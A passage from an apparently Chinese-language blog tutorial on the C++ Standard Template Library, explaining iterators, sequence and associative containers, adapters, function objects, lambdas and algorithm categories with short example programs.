<imgsrc="https://pica.zhimg.com/80/v2-9cb5c611c9ab48c561a010de1208c150_1440w.png" /></p><p>按操作类型分类： <imgsrc="https://img-blog.csdnimg.cn/20200609192955690.png" /></p><h2 id="迭代器范围">迭代器范围</h2><ul><li>两个迭代器表示一个范围：[p1, p2)，范围包括 p1 但不包括 p2；</li><li>STL 算法通常使用迭代器范围作为输入来传递输入数据；</li><li>有效范围：p1 在 n 次（n &gt; 0）递增（++）操作后满足 p1 == p2。</li></ul><p>程序示例： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//各种迭代器综合使用的示例</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="keyword">class</span> <span class="title class_">InputIterator</span>, <span class="keyword">class</span> <span class="title class_">OutputIterator</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySort</span><span class="params">(InputIterator first, InputIterator last, OutputIterator result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;T&gt; s;</span><br><span class="line">    <span class="keyword">while</span> (first != last)</span><br><span class="line">    &#123;</span><br><span class="line">        s.<span class="built_in">push_back</span>(*first);</span><br><span class="line">        first++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>()); <span class="comment">//sort 参数必须是随机访问迭代器</span></span><br><span class="line">    <span class="built_in">copy</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">double</span> a[<span class="number">5</span>] = &#123;<span class="number">1.2</span>, <span class="number">2.4</span>, <span class="number">0.8</span>, <span class="number">3.3</span>, <span class="number">3.2</span>&#125;;</span><br><span class="line">    <span class="comment">//排序已知数组</span></span><br><span class="line">    <span class="built_in">mySort</span>&lt;<span class="type">double</span>&gt;(a, a + <span class="number">5</span>, <span class="built_in">ostream_iterator</span>&lt;<span class="type">double</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//从标准输入读取几个整数，输出排序结果</span></span><br><span class="line">    <span class="built_in">mySort</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">istream_iterator</span>&lt;<span class="type">int</span>&gt;(cin), <span class="built_in">istream_iterator</span>&lt;<span class="type">int</span>&gt;(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="迭代器辅助函数">迭代器辅助函数</h2><ul><li>advance(p,n)：对 p 执行 n 次增量操作</li><li>distance(first,last)：计算两个迭代器 first 和 last 之间的距离</li></ul><h1 id="容器">容器</h1><h2 id="容器的基本功能和分类">容器的基本功能和分类</h2><p><imgsrc="https://pica.zhimg.com/80/v2-015ee01d628fdd4ee76acf4213a6d583_1440w.png" /></p><p>容器的常用功能 * 使用默认构造函数构造空容器 *支持关系运算符：==、!=、&lt;、&lt;=、&gt;、&gt;= *begin()、end()：获取容器的头尾迭代器（<strong>实际上指向容器最后一个元素之后的元素</strong>）* cbegin()、cend()：获取容器的头尾常量迭代器，在不改变容器时更安全 *clear()：清空容器 * empty()：检查容器是否为空 *size()：获取容器中元素的数量 * s1.swap(s2)：交换容器 s1 和 s2 的内容</p><p>相关数据类型（S 表示容器类型） *S::iterator：指向容器元素的迭代器类型 *S::const_iterator：常量迭代器类型</p><p>使用一般容器的begin()/end()，获得的迭代器都是前向迭代器，而可逆容器提供双向迭代器。</p><div class="note info flat"><p>实际上，STL模板提供的标准容器至少是可逆容器，但一些非标准模板库提供的容器如slist（单链表）仅提供前向迭代器。</p></div><h3 id="访问可逆容器">访问可逆容器</h3><p>STL 为每个可逆容器提供反向迭代器，可以通过以下成员函数获得： *rbegin()：指向容器末尾的反向迭代器 *rend()：指向容器开头的反向迭代器</p><p>反向迭代器的类型名称表示如下（S 表示容器类型）： *S::reverse_iterator：反向迭代器类型 *S::const_reverse_iterator：常量反向迭代器类型</p><p>反向迭代器是普通迭代器的适配器，其中反向迭代器的 ++被映射到前向迭代器的 –。</p><blockquote><p>细节： 迭代器及其反向迭代器可以相互转换。例如：如果 p1 是类型S::iterator 的迭代器，则使用表达式 S::reverse_iterator(p1) 可以获得与 p1对应的反向迭代器；也可以使用 base函数获取与反向迭代器对应的普通迭代器，例如：r1 是通过S::reverse_iterator(p1) 构造的反向迭代器，则 r1.base() == p1。但 r1 和p1 不指向同一个元素，r1 指向的元素始终与 p1-1 指向的元素相同。</p></blockquote><h2 id="顺序容器">顺序容器</h2><p>STL 中的顺序容器 * vector * deque * list * forward_list * array</p><ul><li>元素线性排列，可以随时在指定位置插入和删除元素。</li><li>必须符合 Assignable 概念（即具有公共复制构造函数并可以使用 “=”赋值）。</li><li>array 对象具有固定大小，forward_list 具有特殊的添加和删除操作。</li></ul><h3 id="顺序容器接口">顺序容器接口</h3><div class="note danger flat"><p>不包括单链表（forward_list）和数组</p></div><ol type="1"><li>构造函数</li></ol><ul><li>列表初始化，例如<code>vector&lt;int&gt; arr = &#123;1,4,5,7&#125;;</code></li></ul><ol start="2" type="1"><li>赋值函数</li></ol><ul><li>assign</li></ul><ol start="3" type="1"><li>插入函数</li></ol><ul><li><code>insert(iterator pos, const T&amp; v)</code>，在 pos位置插入后，返回新插入元素的迭代器；</li><li>push_front（仅适用于 list 和 deque）、push_back；</li><li>emplace_front、emplace 和emplace_back，这些操作将元素构造而不是复制到容器中，这些操作分别对应push_front、insert 和push_back，允许我们将元素放置在容器的头部、指定位置和尾部。</li></ul><ol start="4" type="1"><li>删除函数<ul><li>erase、clear、pop_front（仅适用于 list 和 deque）、pop_back</li></ul></li><li>直接访问头部和尾部元素<ul><li>front、back</li></ul></li><li>改变大小<ul><li>resize</li></ul></li></ol><div class="note success flat"><p>请记住，头部操作不适合具有连续物理地址的数据结构。</p></div><h3 id="vector">Vector</h3><p>特性： * 可扩展的动态数组 * 快速随机访问，快速在尾部插入或删除 *中间或头部插入或删除较慢</p><p>Vector 容量：实际分配空间的大小 * s.capacity()：返回当前容量 *s.reserve(n)：如果容量小于 n，则扩展 s 使其容量至少为 n *s.shrink_to_fit()：回收未使用的元素空间，即 size 和 capacity函数返回值相等</p><div class="note danger flat"><p>失效： 如果添加元素导致 vector扩展，则所有迭代器、指针和引用将失效，因为内存空间被重新分配；如果没有扩展，则仅插入（或删除）元素之后的迭代器将失效（因为元素被移动）。</p></div><h3 id="deque">Deque</h3><p>特性 * 快速在两端插入或删除 * 中间插入或删除较慢 * 随机访问更快，但比vector 容器慢</p><p>Deque 是许多 STL实现中的分段数组。容器中的元素存储在固定大小的数组段中。此外，容器需要维护一个索引数组，存储这些分段数组的第一个地址，因此deque 的连续性是一种幻觉。</p><figure><imgsrc="https://img-blog.csdnimg.cn/20190217155302649.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQ2MjIwMg==,size_16,color_FFFFFF,t_70"alt="https://img-blog.csdnimg.cn/20190217155302649.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQ2MjIwMg==,size_16,color_FFFFFF,t_70" /><figcaptionaria-hidden="true">https://img-blog.csdnimg.cn/20190217155302649.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQ2MjIwMg==,size_16,color_FFFFFF,t_70</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先按降序输出奇数，然后按升序输出偶数。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">istream_iterator&lt;<span class="type">int</span>&gt; <span class="title">i1</span><span class="params">(cin)</span>, i2</span>; <span class="comment">//创建一对输入流迭代器，第一个是标准输入的开始，第二个是标准输入的结束</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">s1</span><span class="params">(i1, i2)</span></span>;            <span class="comment">//通过输入流迭代器从标准输入流输入数据</span></span><br><span class="line">    <span class="built_in">sort</span>(s<span class="number">1.</span><span class="built_in">begin</span>(), s<span class="number">1.</span><span class="built_in">end</span>());        <span class="comment">//对输入的整数进行排序</span></span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; s2;</span><br><span class="line">    <span class="comment">//以下循环遍历 s1</span></span><br><span class="line">    <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator iter = s<span class="number">1.</span><span class="built_in">begin</span>(); iter != s<span class="number">1.</span><span class="built_in">end</span>(); ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*iter % <span class="number">2</span> == <span class="number">0</span>) <span class="comment">//偶数放入 s2 尾部</span></span><br><span class="line">            s<span class="number">2.</span><span class="built_in">push_back</span>(*iter);</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//奇数放入 s2 头部</span></span><br><span class="line">            s<span class="number">2.</span><span class="built_in">push_front</span>(*iter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出 s2 的结果</span></span><br><span class="line">    <span class="built_in">copy</span>(s<span class="number">2.</span><span class="built_in">begin</span>(), s<span class="number">2.</span><span class="built_in">end</span>(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="list">List</h3><p>底层逻辑是双向链表。</p><p>特性 * 在任何位置快速插入和删除元素 * 不支持随机访问</p><p>拼接操作 <code>s1.splice(p, s2, q1, q2)</code> 意味着将 [q1, q2) 从s2 移动到 s1 中指向 p 的元素之前</p><h3 id="forward-list">Forward List</h3><p>特性： *单链表中的每个节点仅有指向下一个节点的指针，没有简单的方法获取节点的前驱；* 不定义 insert、emplace 和 erase 操作，但定义了insert_after、emplace_after 和 erase_after 操作。它们的参数与 list 的insert、emplace 和 erase 相同，但它们不插入或删除指向迭代器 p1的元素，而是对 p1 指向的元素之后的节点进行操作； * 不支持 size操作。</p><h3 id="array">Array</h3><p>特性： * array是对内置数组的封装，提供了一种更安全和方便的使用数组的方法 * array对象的大小是固定的。在定义时，需要指定元素类型和容器大小。 *不能动态改变容器大小</p><p><imgsrc="https://picx.zhimg.com/80/v2-ea9110203c1e89cfaac565d2c3356953_1440w.jpeg" /></p><h2 id="顺序容器插入迭代器和适配器">顺序容器插入迭代器和适配器</h2><h3 id="顺序容器插入迭代器">顺序容器插入迭代器</h3><p>概念：用于在容器的头部、尾部或中间指定位置插入元素的迭代器，包括前插入器（front_inserter）、后插入器（back_inserter）和任意位置插入器（inserter）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; s;</span><br><span class="line"><span class="function">back_inserter <span class="title">iter</span><span class="params">(s)</span></span>;</span><br><span class="line">*(iter++) = <span class="number">5</span>; <span class="comment">//通过 iter 在 s 的末尾插入 5</span></span><br></pre></td></tr></table></figure><h3 id="顺序容器适配器">顺序容器适配器</h3><p>基于顺序容器构建一些常用的数据结构，是顺序容器的封装： *Stack：第一个压入的元素最后弹出 * Queue：第一个压入的元素第一个弹出 *Priority queue：首先弹出“最大”的元素</p><p>Stack 可以使用任何顺序容器作为基础容器，但 queue仅允许<strong>前插入的顺序容器</strong>（deque 或 list）</p><div class="note info flat"><p>优先队列的本质是最大（最小）二叉堆。</p></div><h4 id="stack-和-queue-支持的常见操作">Stack 和 Queue支持的常见操作</h4><ul><li>s1 op s2 op 可以是 ==、!=、&lt;、&lt;=、&gt;、&gt;=之一，它比较两个容器适配器之间的元素，<strong>按字典顺序</strong>；</li><li>s.size() 返回 s 中的元素数量；</li><li>s.empty() 返回 s 是否为空；</li><li>s.push(t) 将元素 t 压入 s；</li><li>s.pop() 从 s 中弹出一个元素。对于stack，每次弹出的元素是最后压入的元素，而对于queue，每次弹出的元素是第一个压入的元素；</li><li><strong>不支持迭代器</strong>，因为它们不允许访问任意元素。</li></ul><h4 id="stack-和-queue-的不同操作">Stack 和 Queue 的不同操作</h4><p>Stack 操作： * s.top() 返回对 stack 顶部元素的引用</p><p>Queue 操作： * s.front() 获取对队列头部元素的引用 * s.back()获取对队列尾部元素的引用</p><h4 id="优先队列">优先队列</h4><p>优先队列也支持像 stack 和 queue一样的元素压入和弹出，但元素弹出的顺序与元素大小有关。每次弹出的元素始终是容器中的“最大”元素。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="keyword">class</span> <span class="title class_">Sequence</span> = vector&lt;T&gt;</span><br><span class="line"><span class="keyword">class</span> priority_queue; </span><br></pre></td></tr></table></figure>优先队列的基础容器必须是一个<strong>支持随机访问</strong>的顺序容器。 *支持 stack 和 queue 的 size、empty、push、pop 成员函数，使用方法与 stack和 queue 相同。 * 优先队列<strong>不支持比较操作</strong>。 * 类似于stack，优先队列提供一个 top函数，可以获取对下一个要弹出的元素（即“最大”元素）的引用。</p><h2 id="关联容器">关联容器</h2><h3 id="关联容器的分类和基本功能">关联容器的分类和基本功能</h3><p>对于关联容器，每个元素都有一个键，容器中元素的顺序按<strong>键值的升序</strong>排列。</p><blockquote><p>与顺序容器不同，查找元素的时间复杂度为 <spanclass="math inline">\(O(n)\)</span>，关联容器根据键大小将元素组织成<strong>平衡二叉树</strong>，时间复杂度为<span class="math inline">\(O(\log n)\)</span>。</p></blockquote><p>有序关联容器的分类： * 单一关联容器（set 和 map） *键值是<strong>唯一的</strong>，一个键值<strong>只能对应一个元素</strong>* 多重关联容器（multiset 和 multimap） *键值是<strong>不唯一的</strong>，一个键值可以<strong>对应多个元素</strong>* 简单关联容器（set 和 multiset） *容器只有<strong>一个类型参数</strong>，如set<K>、multiset<K>，表示键类型 * 容器的<strong>元素就是键本身</strong>* 二元关联容器（map 和 multimap） *容器有<strong>两个类型参数</strong>，如map&lt;K,V&gt;、multimap&lt;K,V&gt;，分别表示键和附加数据类型 *容器的元素类型是pair&lt;K,V&gt;，即由<strong>键类型和附加数据类型</strong>组成的二元元组</p><p>接口 * 构造：列表初始化，例如<code>map&lt;string, int&gt; id_map = &#123;&#123;"Xiao Ming", 1&#125;, &#123;"Li Hua", 2&#125;&#125;</code> *插入：insert * 删除：erase * 查找：find *边界：lower_bound、upper_bound、equal_range * 计数：count</p><blockquote><p>C++11 新标准定义了 4 种无序关联容器unordered_set、unordered_map、unordered_multiset、unordered_multimap *不使用比较运算符来组织元素，而是通过哈希函数和键类型的 == 运算符。 *提供与有序容器相同的操作 * 可以直接使用内置类型关键字定义无序容器。 *不能直接使用自定义类键类型定义无序容器。如果需要，必须提供我们自己的哈希模板。</p></blockquote><h3 id="set">Set</h3><p>Set 用于存储一组不重复的元素。由于 set的元素是有序的，因此可以高效地查找指定元素，并方便地获取容器中指定大小元素的范围。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pair&lt;set&lt;<span class="type">double</span>&gt;::iterator,<span class="type">bool</span>&gt; r=s.<span class="built_in">insert</span>(v); </span><br><span class="line"><span class="keyword">if</span> (!r.second);</span><br><span class="line"><span class="comment">//让我解释一下。insert 函数的返回值是一个二元元组，第一个是一个迭代器，第二个是一个布尔值，指示插入是否可能。</span></span><br><span class="line"><span class="comment">//第一行构造了一个 r 二元元组，访问其两个元素的方法是 r.first 和 r.second。</span></span><br></pre></td></tr></table></figure><h3 id="map">Map</h3><p>Map 和 set 都属于单一关联容器。它们的主要区别在于 set的元素类型是键本身，而 map的元素类型是由键和附加数据组成的<strong>二元元组</strong>。</p><p>在 set 中通过键查找元素时，通常仅用于确定元素是否存在，而在 map中通过键查找元素时，除了确定其存在性外，还可以获取<strong>相应的附加数据</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">courses.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;CSAPP&quot;</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">//二元元组初始化可以使用 pair&lt;first_type,second_type&gt; r = &#123;element1,element2&#125;</span></span><br><span class="line"><span class="comment">//同时，如果您想将其用作函数参数，可以省略构造步骤，直接使用 make_pair(element1,element2)</span></span><br></pre></td></tr></table></figure><h3 id="multiset-和-multimap">Multiset 和 Multimap</h3><p>Multiset 是一个<strong>允许重复元素</strong>的集合，而 multimap是一个<strong>允许一个键对应多个附加数据</strong>的映射。</p><p>Multiset 和 set、multimap 和 map的用法相似，仅在少数成员函数上有细微差别。区别主要体现在<strong>移除键必须唯一的限制</strong>。</p><h1 id="函数对象">函数对象</h1><h2 id="函数对象的基本概念和分类">函数对象的基本概念和分类</h2><p>函数对象实际上是行为像函数的对象。它们可以没有参数或有多个参数，其功能是获取值或改变操作的状态。</p><blockquote><p>任何普通函数和任何重载调用运算符 operator()的类的对象都满足函数对象的特性</p></blockquote><p><imgsrc="https://pic1.zhimg.com/80/v2-31d073302a8e96d89105422051760a76_1440w.png" /></p><p>以下是两个结果相同的程序： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span> <span class="comment">//包含数值算法头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//定义一个普通函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mult</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x * y; &#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a[] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line">  <span class="type">const</span> <span class="type">int</span> N = <span class="built_in">sizeof</span>(a) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;将 a 中所有元素相乘的结果是 &quot;</span> &lt;&lt; <span class="built_in">accumulate</span>(a, a + N, <span class="number">1</span>, mult) &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span> <span class="comment">//包含数值算法头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MultClass</span>&#123; <span class="comment">//定义 MultClass 类</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//重载运算符 operator()</span></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> x * y; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a[] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line">  <span class="type">const</span> <span class="type">int</span> N = <span class="built_in">sizeof</span>(a) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;将 a 中所有元素相乘的结果是 &quot;</span> &lt;&lt; <span class="built_in">accumulate</span>(a, a + N, <span class="number">1</span>, <span class="built_in">MultClass</span>()) <span class="comment">//MultClass 对象传递给通用算法 </span></span><br><span class="line">  &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个普通函数，一个类重载了 ()。</p><p>STL 提供的函数对象： * 算术运算的函数对象 *关系运算和逻辑运算的函数对象（要求返回值为 bool）</p><p><imgsrc="https://pic4.zhimg.com/80/v2-0e4a6bbd4d06bb5765d22c2d1662cdad_1440w.jpeg" /></p><p><imgsrc="https://pica.zhimg.com/80/v2-7df16ba33fcbf887ef22acad3f7855ee_1440w.jpeg" /></p><h2 id="lambda-表达式">Lambda 表达式</h2><p><a href="https://www.cnblogs.com/DswCnblog/p/5629165.html">Lambda表达式详细信息</a> 定义：[捕获列表]（参数列表）-&gt; 返回类型 {函数体} *捕获列表可以捕获 lambda 所在函数的局部变量 *参数列表、返回类型和函数体与普通函数一致 *可以在函数内部定义，理解为无名内联函数 * auto lambda = [] { return“Hello World!”; }; * cout&lt;&lt; lambda() &lt;&lt;std::endl;//执行与函数对象一致</p><p>捕获列表有值捕获、引用捕获和隐式捕获方法 * int size = 10, base = 0;//局部变量 * auto longer = <ahref="const%20string%20&amp;s">size</a>{return s.size()&gt;size;}//值捕获 * auto longer = <ahref="const%20string%20&amp;s">&amp;size</a>{returns.size()&gt;size;}//引用捕获 * auto longer = <ahref="const%20string%20&amp;s">=</a>{returns.size()&gt;base;}//隐式值捕获 * auto longer = <ahref="const%20string%20&amp;s">&amp;</a>{returns.size()&gt;size;}//隐式引用捕获 ## 函数适配器 <imgsrc="https://pic4.zhimg.com/80/v2-2ed3c65215b6553242c0785fb1c84ae7_1440w.jpeg" /></p><p>bind2nd 生成 binder2nd 函数适配器的实例 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> placeholders; <span class="comment">//占位符 _n 的命名空间</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> intArr[] = &#123; <span class="number">30</span>, <span class="number">90</span>, <span class="number">10</span>, <span class="number">40</span>, <span class="number">70</span>, <span class="number">50</span>, <span class="number">20</span>, <span class="number">80</span> &#125;;</span><br><span class="line">  <span class="type">const</span> <span class="type">int</span> N = <span class="built_in">sizeof</span>(intArr) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(intArr, intArr + N)</span></span>;</span><br><span class="line">  <span class="keyword">auto</span> p = <span class="built_in">find_if</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(),<span class="built_in">bind2nd</span>(greater&lt;&gt;(), <span class="number">40</span>));</span><br><span class="line">  <span class="keyword">if</span> (p == a.<span class="built_in">end</span>())</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;没有大于 40 的元素&quot;</span> &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;第一个大于 40 的元素是: &quot;</span> &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>函数模板的内容远不止这些，逐步在实践中学习</p></blockquote><h1 id="算法">算法</h1><p>算法的特征： * STL 算法本身是函数模板 * 通过迭代器获取输入数据 *通过函数对象处理数据 * 通过迭代器输出结果 * STL算法是通用的，与特定数据类型和容器类型无关</p><p>算法分类： * 不可变序列算法 * 可变序列算法 * 排序和搜索算法 *数值算法</p><blockquote><p>代码中使用的所有算法都可以在图像中找到，因此不再解释。</p></blockquote><h2 id="不可变序列算法">不可变序列算法</h2><p>不直接修改操作容器内容的算法，用于查找指定元素、比较两个序列是否相等、计数元素等。</p><p><imgsrc="https://pic3.zhimg.com/80/v2-cbe6b4025b2427cf9b3936eb3a467b96_1440w.png" /></p><p>示例： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> InputIterator, <span class="keyword">class</span> UnaryPredicate&gt;</span></span><br><span class="line"><span class="function">InputIterator <span class="title">find_if</span><span class="params">(InputIterator first, InputIterator last, UnaryPredicate pred;</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//在 [first, last) 范围内查找第一个使 pred(x) 